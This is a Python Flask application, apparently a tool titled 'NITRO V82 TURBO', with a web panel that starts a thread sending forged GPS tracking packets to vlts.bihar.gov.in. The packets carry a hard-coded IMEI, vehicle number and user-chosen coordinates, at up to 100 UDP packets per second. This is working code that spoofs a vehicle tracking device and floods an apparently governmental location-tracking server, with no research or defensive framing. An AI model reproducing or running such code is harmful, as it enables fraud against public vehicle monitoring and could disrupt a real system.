import os
import socket
import threading
import time
import requests
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

# --- V82 TURBO STATE ---
DEFAULTS = {
    "tag": "EGAS",
    "imei": "862567075041793",
    "vno": "BR04GA5974",
    "lat": "25.65",
    "lon": "84.78",
    "proto": "UDP"
}

status = {
    "firing": False,
    "count": 0,
    "p_stat": "Waiting for Sync...",
    "sync": "Never",
    **DEFAULTS
}

HTML_V82 = """
<!DOCTYPE html>
<html>
<head>
    <title>NITRO V82 ULTIMATE</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding: 10px; }
        .box { border: 2px solid #0f0; padding: 15px; display: inline-block; border-radius: 15px; width: 100%; max-width: 420px; box-shadow: 0 0 20px #0f0; background: #050505; }
        .metric { font-size: 50px; color: #fff; margin: 10px 0; text-shadow: 0 0 10px #0f0; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; text-align: left; }
        input, select { width: 90%; padding: 10px; margin: 5px 0; background: #111; border: 1px solid #0f0; color: #0f0; border-radius: 5px; text-transform: uppercase; }
        .full { grid-column: span 2; }
        .btn { padding: 12px; font-size: 16px; cursor: pointer; border: none; border-radius: 8px; width: 100%; font-weight: bold; margin-top: 8px; text-transform: uppercase; }
        .start { background: #006400; color: #fff; border: 1px solid #0f0; }
        .stop { background: #600; color: #fff; border: 1px solid #f00; }
        .reset { background: #333; color: #ccc; border: 1px solid #666; }
        .status-bar { background: #111; padding: 8px; margin: 10px 0; border-radius: 5px; font-size: 12px; border: 1px solid #333; }
    </style>
</head>
<body>
    <div class="box">
        <h3>🚀 NITRO V82 TURBO</h3>
        <div class="metric" id="cnt">0</div>
        
        <div class="status-bar">
            📡 Portal: <span id="ps">{{p_stat}}</span> | 🕒 Sync: <span id="ls">{{sync}}</span>
        </div>

        <form action="/action" method="post" class="grid">
            <div class="full"><label>ENGINE TAG</label><input type="text" name="tag" value="{{tag}}"></div>
            <div><label>IMEI</label><input type="text" name="imei" value="{{imei}}"></div>
            <div><label>VEHICLE NO</label><input type="text" name="vno" value="{{vno}}"></div>
            <div><label>LATITUDE</label><input type="text" name="lat" value="{{lat}}"></div>
            <div><label>LONGITUDE</label><input type="text" name="lon" value="{{lon}}"></div>
            <div class="full">
                <label>PROTOCOL</label>
                <select name="proto">
                    <option value="UDP" {% if proto == 'UDP' %}selected{% endif %}>UDP (100 PKT/S)</option>
                    <option value="TCP" {% if proto == 'TCP' %}selected{% endif %}>TCP (50 PKT/S)</option>
                </select>
            </div>
            <button class="btn start full" name="btn" value="start">START ENGINE</button>
            <button class="btn stop full" name="btn" value="stop">STOP ENGINE</button>
            <button class="btn reset full" name="btn" value="reset">RESET DATA</button>
        </form>
    </div>
    <script>
        setInterval(() => {
            fetch('/data').then(r => r.json()).then(d => {
                document.getElementById('cnt').innerText = d.count.toLocaleString();
                document.getElementById('ps').innerText = d.p_stat;
                document.getElementById('ls').innerText = d.sync;
            });
        }, 1000);
    </script>
</body>
</html>
"""

def portal_monitor():
    session = requests.Session()
    while True:
        if status["firing"]:
            try:
                # Add your portal URL here for real data fetch
                # r = session.get("PORTAL_URL", timeout=2)
                status["p_stat"] = "FETCHING..."
                time.sleep(1) 
                status["p_stat"] = "PORTAL CONNECTED"
            except:
                status["p_stat"] = "PORTAL OFFLINE"
        time.sleep(3) # Faster sync cycle

def firing_engine():
    target = ("vlts.bihar.gov.in", 9999)
    while status["firing"]:
        try:
            now = datetime.now()
            pkt = f"$PVT,{status['tag']},2.1.1,NR,01,L,{status['imei']},{status['vno']},1,{now.strftime('%d%m%Y')},{now.strftime('%H%M%S')},{status['lat']},N,{status['lon']},E,0.0,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a,e3,e3,0a,7,e3,0a,7,c7,0a,10,e3,0a,0,0001,00,000041,DDE3*".encode()
            
            if status["proto"] == "UDP":
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                for _ in range(100):
                    if not status["firing"]: break
                    sock.sendto(pkt, target)
                    status["count"] += 1
                sock.close()
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect(target)
                for _ in range(50):
                    if not status["firing"]: break
                    sock.send(pkt)
                    status["count"] += 1
                sock.close()
            status["sync"] = now.strftime("%H:%M:%S")
            time.sleep(1)
        except:
            time.sleep(2)

@app.route('/')
def home():
    return render_template_string(HTML_V82, **status)

@app.route('/data')
def data(): return jsonify(status)

@app.route('/action', methods=['POST'])
def action():
    val = request.form.get('btn')
    if val == "reset":
        status.update(DEFAULTS)
        status["count"] = 0
        status["firing"] = False
    else:
        # Capitalize all inputs
        status.update({
            "tag": request.form.get('tag', DEFAULTS['tag']).upper(),
            "imei": request.form.get('imei', DEFAULTS['imei']).upper(),
            "vno": request.form.get('vno', DEFAULTS['vno']).upper(),
            "lat": request.form.get('lat', DEFAULTS['lat']),
            "lon": request.form.get('lon', DEFAULTS['lon']),
            "proto": request.form.get('proto', 'UDP')
        })
        if val == "start" and not status["firing"]:
            status["firing"] = True
            threading.Thread(target=firing_engine, daemon=True).start()
        elif val == "stop":
            status["firing"] = False
    return home()

if __name__ == "__main__":
    threading.Thread(target=portal_monitor, daemon=True).start()
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
